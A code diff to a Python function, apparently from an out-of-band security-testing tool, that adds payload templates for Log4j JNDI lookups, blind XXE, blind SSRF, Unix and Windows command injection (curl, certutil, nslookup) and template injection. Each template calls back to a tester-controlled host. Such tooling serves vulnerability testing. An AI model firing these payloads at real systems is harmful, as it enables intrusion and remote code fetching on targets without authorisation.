@@ -336,6 +336,15 @@ def generate_oast_token(
         "vuln_type": vuln_type.upper(),
         "project": target_project,
         "description": description or f"OAST correlation token for {vuln_type}",
+        "payload_templates": {
+            "log4j_jndi": f"${{jndi:ldap://{dns_hostname}/a}}",
+            "log4j_dns": f"${{jndi:dns://{dns_hostname}/a}}",
+            "blind_xxe": f'<!ENTITY % xxe SYSTEM "{callback_url}/eval.dtd"> %xxe;',
+            "blind_ssrf": callback_url,
+            "cmd_injection_unix": f"; curl -s {callback_url} || nslookup {dns_hostname} ;",
+            "cmd_injection_win": f"& certutil -urlcache -split -f {callback_url} & nslookup {dns_hostname}",
+            "ssti_resolver": f'{{{{resolve "{dns_hostname}"}}}}'
+        },
         "created_at": datetime.now().isoformat()
     }
 
